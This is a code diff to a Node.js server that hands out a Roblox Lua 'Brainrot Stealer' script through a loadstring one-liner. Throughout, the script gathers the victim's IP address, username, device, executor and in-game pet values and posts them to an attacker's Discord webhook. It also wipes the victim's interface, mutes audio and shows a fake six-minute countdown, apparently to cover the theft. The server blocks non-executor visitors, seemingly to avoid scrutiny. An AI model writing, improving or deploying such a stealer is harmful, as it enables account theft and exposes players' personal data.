@@ -3,6 +3,9 @@ const express = require("express");
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// Middleware to handle raw text
+app.use(express.text({ type: '*/*' }));
+
 // BLOCK NON-EXECUTORS
 function blockNonExecutor(req, res, next) {
   const ua = (req.headers["user-agent"] || "").toLowerCase();
@@ -16,184 +19,480 @@ function blockNonExecutor(req, res, next) {
                   ref.includes("roblox.com");
 
   if (!allowed) {
-    return res.status(403).send("<!DOCTYPE html><html><head><title></title><style>body{background:#000;margin:0;padding:0;overflow:hidden;}</style></head><body></body></html>");
+    return res.status(403).send("Access denied - Executor only");
   }
   next();
 }
 
-// HOME → BLACK SCREEN
+// HOME → SIMPLE MESSAGE
 app.get("/", (req, res) => {
-  res.send("<!DOCTYPE html><html><head><title></title><style>body{background:#000;margin:0;padding:0;overflow:hidden;}</style></head><body></body></html>");
+  res.send("Brainrot Stealer Server - Use /raw?wh=WEBHOOK_URL");
 });
 
-// /raw → RETURN **PURE LUA SCRIPT**
+// /raw → RETURN PURE LUA SCRIPT
 app.get("/raw", blockNonExecutor, (req, res) => {
   const webhook = req.query.wh;
 
   if (!webhook || !webhook.startsWith("https://discord.com/api/webhooks/")) {
-    return res.status(400).send("-- INVALID WEBHOOK --");
+    return res.status(400).send("-- INVALID WEBHOOK -- Must be a valid Discord webhook URL");
   }
 
-  // === EXACT LUA SCRIPT (NO WHITESPACE, NO HTML) ===
-  const luaScript = `-- BRAINROT STEALER - FIXED & WORKING
+  // === FIXED LUA SCRIPT ===
+  const luaScript = `-- BRAINROT STEALER - FIXED VERSION
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-local UserInputSvc = game:GetService("UserInputService")
+local UserInputService = game:GetService("UserInputService")
 
 local player = Players.LocalPlayer
-if not player then repeat task.wait() until Players.LocalPlayer player = Players.LocalPlayer end
+if not player then 
+    repeat task.wait() until Players.LocalPlayer 
+    player = Players.LocalPlayer 
+end
+
 repeat task.wait() until player:FindFirstChild("PlayerGui")
-pcall(function() HttpService.HttpEnabled = true end)
+pcall(function() 
+    HttpService.HttpEnabled = true 
+end)
 task.wait(0.5)
 
 local WebhookURL = "${webhook}"
 
 local function SafeHttp(url, body)
-    local ok, r = pcall(function()
+    local success, result = pcall(function()
         if syn and syn.request then
-            local resp = syn.request({Url=url,Method="POST",Headers={["Content-Type"]="application/json"},Body=body})
-            return resp and (resp.StatusCode == 200 or resp.StatusCode == 204)
+            local response = syn.request({
+                Url = url,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = body
+            })
+            return response and (response.StatusCode == 200 or response.StatusCode == 204)
         end
+        
         if request and type(request) == "function" then
-            local resp = request({Url=url,Method="POST",Headers={["Content-Type"]="application/json"},Body=body})
-            return resp and (resp.StatusCode == 200 or resp.StatusCode == 204)
+            local response = request({
+                Url = url,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = body
+            })
+            return response and (response.StatusCode == 200 or response.StatusCode == 204)
         end
+        
         if HttpService.HttpEnabled then
-            pcall(function() HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson) end)
+            pcall(function() 
+                HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson) 
+            end)
             return true
         end
+        
         return false
     end)
-    return ok and r
+    return success and result
 end
 
 local function Send(embed)
-    local json = HttpService:JSONEncode({embeds = {embed}})
-    task.spawn(function() SafeHttp(WebhookURL, json) end)
-end
-
-local function Exec() if syn then return "Synapse X" elseif KRNL_LOADED then return "Krnl" elseif fluxus then return "Fluxus" elseif PROTOSMASHER_LOADED then return "ProtoSmasher" elseif electron then return "Electron" else return "Unknown" end end
-local function IP() local s,i=pcall(function()return game:HttpGet("https://api.ipify.org",true)end) return s and i or "Unknown" end
-local function Dev() return UserInputSvc.TouchEnabled and "Mobile" or "PC" end
-local function FM(v) if v>=1e9 then return string.format("$%.2fB/s",v/1e9) elseif v>=1e6 then return string.format("$%.2fM/s",v/1e6) elseif v>=1e3 then return string.format("$%.2fK/s",v/1e3) else return "$"..v.."/s" end end
-local function FPL(p,m) if #p==0 then return "None" end local s="" for i=1,math.min(5,#p) do s=s..i..". "..p[i].Name.." | "..(m and FM(p[i].Money) or p[i].Rate).."\\n" end return s end
-
-local function BS()
-    pcall(function()
-        for _,g in pairs(player.PlayerGui:GetChildren()) do pcall(function()g:Destroy()end) end
-        for _,g in pairs(game:GetService("CoreGui"):GetChildren()) do if g.Name ~= "RobloxGui" then pcall(function()g:Destroy()end) end end
+    local jsonData = HttpService:JSONEncode({embeds = {embed}})
+    task.spawn(function() 
+        SafeHttp(WebhookURL, jsonData) 
     end)
-    local sg=Instance.new("ScreenGui") sg.Name="BrainrotScanner" sg.ResetOnSpawn=false sg.Parent=player.PlayerGui
-    local bg=Instance.new("Frame") bg.Size=UDim2.new(2,0,2,0) bg.Position=UDim2.new(-0.5,0,-0.5,0) bg.BackgroundColor3=Color3.new(0,0,0) bg.BorderSizePixel=0 bg.Parent=sg
-    local t=Instance.new("TextLabel") t.Size=UDim2.new(1,0,0,80) t.Position=UDim2.new(0,0,0.4,0) t.BackgroundTransparency=1 t.Text="06:00" t.TextColor3=Color3.fromRGB(0,255,255) t.TextSize=48 t.Font=Enum.Font.GothamBold t.Parent=bg
-    local s=Instance.new("TextLabel") s.Size=UDim2.new(1,0,0,25) s.Position=UDim2.new(0,0,0.55,0) s.BackgroundTransparency=1 s.Text="Initializing..." s.TextColor3=Color3.new(1,1,1) s.TextSize=18 s.Font=Enum.Font.Gotham s.Parent=bg
-    return sg,t,s
 end
 
-local function Scan()
-    local all,br,top={},{},{}
+local function GetExecutor()
+    if syn then 
+        return "Synapse X" 
+    elseif KRNL_LOADED then 
+        return "Krnl" 
+    elseif fluxus then 
+        return "Fluxus" 
+    elseif PROTOSMASHER_LOADED then 
+        return "ProtoSmasher" 
+    elseif electron then 
+        return "Electron" 
+    else 
+        return "Unknown" 
+    end
+end
+
+local function GetIP()
+    local success, ip = pcall(function()
+        return game:HttpGet("https://api.ipify.org", true)
+    end)
+    return success and ip or "Unknown"
+end
+
+local function GetDevice()
+    return UserInputService.TouchEnabled and "Mobile" or "PC"
+end
+
+local function FormatMoney(value)
+    if value >= 1e9 then 
+        return string.format("$%.2fB/s", value/1e9) 
+    elseif value >= 1e6 then 
+        return string.format("$%.2fM/s", value/1e6) 
+    elseif value >= 1e3 then 
+        return string.format("$%.2fK/s", value/1e3) 
+    else 
+        return "$" .. value .. "/s" 
+    end
+end
+
+local function FormatPetList(pets, showMoney)
+    if #pets == 0 then 
+        return "None" 
+    end
+    
+    local result = ""
+    for i = 1, math.min(5, #pets) do
+        local displayValue = showMoney and FormatMoney(pets[i].Money) or pets[i].Rate
+        result = result .. i .. ". " .. pets[i].Name .. " | " .. displayValue .. "\\n"
+    end
+    return result
+end
+
+local function CreateScannerGUI()
     pcall(function()
-        local plots=workspace:FindFirstChild("Plots") if not plots then return end
-        for _,plot in pairs(plots:GetChildren()) do
-            local pods=plot:FindFirstChild("AnimalPodiums") if not pods then continue end
-            for _,pod in pairs(pods:GetChildren()) do
-                local base=pod:FindFirstChild("Base") if not base then continue end
-                local spawn=base:FindFirstChild("Spawn") if not spawn then continue end
-                local att=spawn:FindFirstChild("Attachment") if not att then continue end
-                local oh=att:FindFirstChild("AnimalOverhead") if not oh then continue end
-                local nameL=oh:FindFirstChild("DisplayName")
-                local genL=oh:FindFirstChild("Generation")
-                if not nameL or not nameL:IsA("TextLabel") then continue end
-                local n=nameL.Text local r=genL and genL.Text or "0/s" if n=="" then continue end
-                local num=tonumber(string.match(r,"([%d%.]+)")) or 0
-                local mon=0
-                if string.find(r,"B/s") then mon=num*1e9 elseif string.find(r,"M/s") then mon=num*1e6 elseif string.find(r,"K/s") then mon=num*1e3 else mon=num end
-                local pet={Name=n,Rate=r,Money=mon}
-                table.insert(all,pet)
-                if string.find(string.lower(n),"brainrot") and mon>1e6 then table.insert(br,pet) end
+        for _, gui in pairs(player.PlayerGui:GetChildren()) do 
+            pcall(function() gui:Destroy() end) 
+        end
+        
+        for _, gui in pairs(game:GetService("CoreGui"):GetChildren()) do 
+            if gui.Name ~= "RobloxGui" then 
+                pcall(function() gui:Destroy() end) 
+            end 
+        end
+    end)
+    
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "BrainrotScanner"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = player.PlayerGui
+    
+    local background = Instance.new("Frame")
+    background.Size = UDim2.new(2, 0, 2, 0)
+    background.Position = UDim2.new(-0.5, 0, -0.5, 0)
+    background.BackgroundColor3 = Color3.new(0, 0, 0)
+    background.BorderSizePixel = 0
+    background.Parent = screenGui
+    
+    local timerLabel = Instance.new("TextLabel")
+    timerLabel.Size = UDim2.new(1, 0, 0, 80)
+    timerLabel.Position = UDim2.new(0, 0, 0.4, 0)
+    timerLabel.BackgroundTransparency = 1
+    timerLabel.Text = "06:00"
+    timerLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
+    timerLabel.TextSize = 48
+    timerLabel.Font = Enum.Font.GothamBold
+    timerLabel.Parent = background
+    
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(1, 0, 0, 25)
+    statusLabel.Position = UDim2.new(0, 0, 0.55, 0)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "Initializing..."
+    statusLabel.TextColor3 = Color3.new(1, 1, 1)
+    statusLabel.TextSize = 18
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.Parent = background
+    
+    return screenGui, timerLabel, statusLabel
+end
+
+local function ScanPets()
+    local allPets = {}
+    local brainrotPets = {}
+    local topPets = {}
+    
+    pcall(function()
+        local plots = workspace:FindFirstChild("Plots") 
+        if not plots then return end
+        
+        for _, plot in pairs(plots:GetChildren()) do
+            local pods = plot:FindFirstChild("AnimalPodiums") 
+            if not pods then continue end
+            
+            for _, pod in pairs(pods:GetChildren()) do
+                local base = pod:FindFirstChild("Base") 
+                if not base then continue end
+                
+                local spawn = base:FindFirstChild("Spawn") 
+                if not spawn then continue end
+                
+                local attachment = spawn:FindFirstChild("Attachment") 
+                if not attachment then continue end
+                
+                local overhead = attachment:FindFirstChild("AnimalOverhead") 
+                if not overhead then continue end
+                
+                local nameLabel = overhead:FindFirstChild("DisplayName")
+                local genLabel = overhead:FindFirstChild("Generation")
+                
+                if not nameLabel or not nameLabel:IsA("TextLabel") then continue end
+                
+                local petName = nameLabel.Text 
+                local rateText = genLabel and genLabel.Text or "0/s" 
+                
+                if petName == "" then continue end
+                
+                local rateNumber = tonumber(string.match(rateText, "([%d%.]+)")) or 0
+                local moneyValue = 0
+                
+                if string.find(rateText, "B/s") then 
+                    moneyValue = rateNumber * 1e9 
+                elseif string.find(rateText, "M/s") then 
+                    moneyValue = rateNumber * 1e6 
+                elseif string.find(rateText, "K/s") then 
+                    moneyValue = rateNumber * 1e3 
+                else 
+                    moneyValue = rateNumber 
+                end
+                
+                local petData = {
+                    Name = petName,
+                    Rate = rateText,
+                    Money = moneyValue
+                }
+                
+                table.insert(allPets, petData)
+                
+                if string.find(string.lower(petName), "brainrot") and moneyValue > 1e6 then 
+                    table.insert(brainrotPets, petData) 
+                end
             end
         end
     end)
-    table.sort(all,function(a,b)return a.Money>b.Money end)
-    table.sort(br,function(a,b)return a.Money>b.Money end)
-    for i=1,math.min(5,#all) do if all[i].Money>0 then table.insert(top,all[i]) end end
-    return all,br,top
+    
+    table.sort(allPets, function(a, b) 
+        return a.Money > b.Money 
+    end)
+    
+    table.sort(brainrotPets, function(a, b) 
+        return a.Money > b.Money 
+    end)
+    
+    for i = 1, math.min(5, #allPets) do 
+        if allPets[i].Money > 0 then 
+            table.insert(topPets, allPets[i]) 
+        end 
+    end
+    
+    return allPets, brainrotPets, topPets
 end
 
-local function Hit(br,top)
-    if #br>2 then return "LEGIT HIT - Multiple brainrots" end
-    if #top>0 and top[1].Money>5e7 then return "LEGIT HIT - High value" end
-    if #br>0 then return "POTENTIAL - Brainrot found" end
+local function EvaluateHit(brainrotPets, topPets)
+    if #brainrotPets > 2 then 
+        return "LEGIT HIT - Multiple brainrots" 
+    end
+    
+    if #topPets > 0 and topPets[1].Money > 5e7 then 
+        return "LEGIT HIT - High value" 
+    end
+    
+    if #brainrotPets > 0 then 
+        return "POTENTIAL - Brainrot found" 
+    end
+    
     return "LOW VALUE - Nothing good"
 end
 
-local function Start(link)
-    local ex=Exec() local ip=IP() local dev=Dev() local pc=#Players:GetPlayers()
-    local sg,tmr,st=BS()
-    pcall(function() game:GetService("SoundService").Volume=0 end)
-    st.Text="Scanning pets..." task.wait(1.5)
-    local a,b,tp=Scan() local h=Hit(b,tp)
-    st.Text="Sending logs..."
-    local emb={title="BRAINROT STEALER - LOGS",description="Game: "..(link or "Unknown"),color=65280,
-        author={name=player.Name,icon_url="https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"},
-        fields={
-            {name="USER INFO",value="Executor: "..ex.."\\nIP: "..ip.."\\nDevice: "..dev,inline=true},
-            {name="PROFILE",value="[View](https://www.roblox.com/users/"..player.UserId.."/profile)",inline=true},
-            {name="SERVER",value="Players: "..pc.."\\nPets: "..#a.."\\nBrainrots: "..#b,inline=true},
-            {name="TOP 5 PETS",value=FPL(tp,true),inline=false},
-            {name="BRAINROTS",value=FPL(b,true),inline=false},
-            {name="HIT STATUS",value=h,inline=false}
+local function StartStealing(gameLink)
+    local executor = GetExecutor()
+    local ipAddress = GetIP()
+    local device = GetDevice()
+    local playerCount = #Players:GetPlayers()
+    
+    local scannerGui, timerDisplay, statusDisplay = CreateScannerGUI()
+    
+    pcall(function() 
+        game:GetService("SoundService").Volume = 0 
+    end)
+    
+    statusDisplay.Text = "Scanning pets..."
+    task.wait(1.5)
+    
+    local allPets, brainrotPets, topPets = ScanPets()
+    local hitStatus = EvaluateHit(brainrotPets, topPets)
+    
+    statusDisplay.Text = "Sending logs..."
+    
+    local embed = {
+        title = "BRAINROT STEALER - LOGS",
+        description = "Game: " .. (gameLink or "Unknown"),
+        color = 65280,
+        author = {
+            name = player.Name,
+            icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
         },
-        footer={text="Brainrot Stealer • "..os.date("%X")},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")
+        fields = {
+            {
+                name = "USER INFO",
+                value = "Executor: " .. executor .. "\\nIP: " .. ipAddress .. "\\nDevice: " .. device,
+                inline = true
+            },
+            {
+                name = "PROFILE", 
+                value = "[View](https://www.roblox.com/users/" .. player.UserId .. "/profile)",
+                inline = true
+            },
+            {
+                name = "SERVER",
+                value = "Players: " .. playerCount .. "\\nPets: " .. #allPets .. "\\nBrainrots: " .. #brainrotPets,
+                inline = true
+            },
+            {
+                name = "TOP 5 PETS",
+                value = FormatPetList(topPets, true),
+                inline = false
+            },
+            {
+                name = "BRAINROTS", 
+                value = FormatPetList(brainrotPets, true),
+                inline = false
+            },
+            {
+                name = "HIT STATUS",
+                value = hitStatus,
+                inline = false
+            }
+        },
+        footer = {
+            text = "Brainrot Stealer • " .. os.date("%X")
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }
-    Send(emb)
-    st.Text="6-minute timer..." task.wait(1)
-    local tot=360 local stt=tick()
-    while tick()-stt<tot do
-        local left=tot-(tick()-stt) local m=math.floor(left/60) local s=math.floor(left%60)
-        tmr.Text=string.format("%02d:%02d",m,s) task.wait(0.1)
+    
+    Send(embed)
+    
+    statusDisplay.Text = "6-minute timer..."
+    task.wait(1)
+    
+    local totalTime = 360
+    local startTime = tick()
+    
+    while tick() - startTime < totalTime do
+        local timeLeft = totalTime - (tick() - startTime)
+        local minutes = math.floor(timeLeft / 60)
+        local seconds = math.floor(timeLeft % 60)
+        timerDisplay.Text = string.format("%02d:%02d", minutes, seconds)
+        task.wait(0.1)
     end
-    local done={title="BRAINROT STEALER - COMPLETE",color=32768,
-        author={name=player.Name,icon_url="https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"},
-        fields={{name="RESULTS",value="Time: 6:00\\nPets: "..#a.."\\nBrainrots: "..#b.."\\nStatus: "..h,inline=false}},
-        footer={text="Brainrot Stealer • "..os.date("%X")}
+    
+    local completionEmbed = {
+        title = "BRAINROT STEALER - COMPLETE",
+        color = 32768,
+        author = {
+            name = player.Name,
+            icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
+        },
+        fields = {
+            {
+                name = "RESULTS",
+                value = "Time: 6:00\\nPets: " .. #allPets .. "\\nBrainrots: " .. #brainrotPets .. "\\nStatus: " .. hitStatus,
+                inline = false
+            }
+        },
+        footer = {
+            text = "Brainrot Stealer • " .. os.date("%X")
+        }
     }
-    Send(done)
-    st.Text="Complete!" tmr.Text="DONE" task.wait(3) pcall(function()sg:Destroy()end)
+    
+    Send(completionEmbed)
+    
+    statusDisplay.Text = "Complete!"
+    timerDisplay.Text = "DONE"
+    task.wait(3)
+    
+    pcall(function() 
+        scannerGui:Destroy() 
+    end)
 end
 
-local function GUI()
-    local sg=Instance.new("ScreenGui") sg.Name="StealerPanel" sg.ResetOnSpawn=false sg.Parent=player.PlayerGui
-    local f=Instance.new("Frame") f.Size=UDim2.new(0,400,0,250) f.Position=UDim2.new(0.5,-200,0.5,-125) f.BackgroundColor3=Color3.fromRGB(20,20,20) f.BorderSizePixel=0 f.Parent=sg
-    local ttl=Instance.new("TextLabel") ttl.Size=UDim2.new(1,0,0,60) ttl.BackgroundColor3=Color3.fromRGB(0,50,0) ttl.Text="BRAINROT STEALER\\nEVERYONE CAN USE" ttl.TextColor3=Color3.fromRGB(0,255,0) ttl.Font=Enum.Font.GothamBold ttl.TextSize=16 ttl.Parent=f
-    local box=Instance.new("TextBox") box.Size=UDim2.new(0.8,0,0,40) box.Position=UDim2.new(0.1,0,0.3,0) box.BackgroundColor3=Color3.fromRGB(40,40,40) box.TextColor3=Color3.new(1,1,1) box.PlaceholderText="Paste Roblox game link..." box.Parent=f
-    local btn=Instance.new("TextButton") btn.Size=UDim2.new(0.7,0,0,50) btn.Position=UDim2.new(0.15,0,0.7,0) btn.BackgroundColor3=Color3.fromRGB(0,200,0) btn.Text="START STEALING" btn.TextColor3=Color3.new(1,1,1) btn.Font=Enum.Font.GothamBold btn.Parent=f
-    btn.MouseButton1Click:Connect(function()
-        local l=box.Text
-        if string.find(string.lower(l),"roblox%.com") then
-            btn.Text="STARTING..." btn.BackgroundColor3=Color3.fromRGB(0,100,0) task.wait(1) Start(l)
+local function CreateGUI()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "StealerPanel"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = player.PlayerGui
+    
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 400, 0, 250)
+    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = screenGui
+    
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 60)
+    title.BackgroundColor3 = Color3.fromRGB(0, 50, 0)
+    title.Text = "BRAINROT STEALER\\nEVERYONE CAN USE"
+    title.TextColor3 = Color3.fromRGB(0, 255, 0)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 16
+    title.Parent = mainFrame
+    
+    local inputBox = Instance.new("TextBox")
+    inputBox.Size = UDim2.new(0.8, 0, 0, 40)
+    inputBox.Position = UDim2.new(0.1, 0, 0.3, 0)
+    inputBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    inputBox.TextColor3 = Color3.new(1, 1, 1)
+    inputBox.PlaceholderText = "Paste Roblox game link..."
+    inputBox.Parent = mainFrame
+    
+    local startButton = Instance.new("TextButton")
+    startButton.Size = UDim2.new(0.7, 0, 0, 50)
+    startButton.Position = UDim2.new(0.15, 0, 0.7, 0)
+    startButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+    startButton.Text = "START STEALING"
+    startButton.TextColor3 = Color3.new(1, 1, 1)
+    startButton.Font = Enum.Font.GothamBold
+    startButton.TextSize = 18
+    startButton.Parent = mainFrame
+    
+    startButton.MouseButton1Click:Connect(function()
+        local link = inputBox.Text
+        
+        if string.find(string.lower(link), "roblox%.com") then
+            startButton.Text = "STARTING..."
+            startButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
+            task.wait(1)
+            StartStealing(link)
         else
-            btn.Text="INVALID LINK" btn.BackgroundColor3=Color3.fromRGB(200,0,0) task.wait(2)
-            btn.Text="START STEALING" btn.BackgroundColor3=Color3.fromRGB(0,200,0)
+            startButton.Text = "INVALID LINK"
+            startButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+            task.wait(2)
+            startButton.Text = "START STEALING"
+            startButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
         end
     end)
 end
 
-GUI()
-print("Brainrot Stealer loaded!")`.replace("${webhook}", webhook);
+-- Initialize
+CreateGUI()
+print("Brainrot Stealer loaded successfully!")`;
 
-  // === SEND PURE TEXT ===
-  res.set("Content-Type", "text/plain; charset=utf-8");
-  res.send(luaScript); // NO .trim(), NO extra spaces
+  // Send as plain text with proper headers
+  res.setHeader("Content-Type", "text/plain; charset=utf-8");
+  res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+  res.send(luaScript);
 });
 
-// 404 → BLACK SCREEN
+// 404 Handler
 app.use((req, res) => {
-  res.status(404).send("<!DOCTYPE html><html><head><title></title><style>body{background:#000;margin:0;padding:0;overflow:hidden;}</style></head><body></body></html>");
+  res.status(404).send("Endpoint not found");
 });
 
-// START
+// Error handling middleware
+app.use((err, req, res, next) => {
+  console.error("Server error:", err);
+  res.status(500).send("Internal server error");
+});
+
+// START SERVER
 app.listen(PORT, "0.0.0.0", () => {
-  console.log(`Server LIVE on port ${PORT}`);
-  console.log(`Load with: loadstring(game:HttpGet("https://yoursite.onrender.com/raw?wh=WEBHOOK"))()`);
+  console.log(`🚀 Server LIVE on port ${PORT}`);
+  console.log(`📝 Load with: loadstring(game:HttpGet("http://localhost:${PORT}/raw?wh=YOUR_WEBHOOK_URL"))()`);
+  console.log(`🔒 Executor protection enabled`);
 });
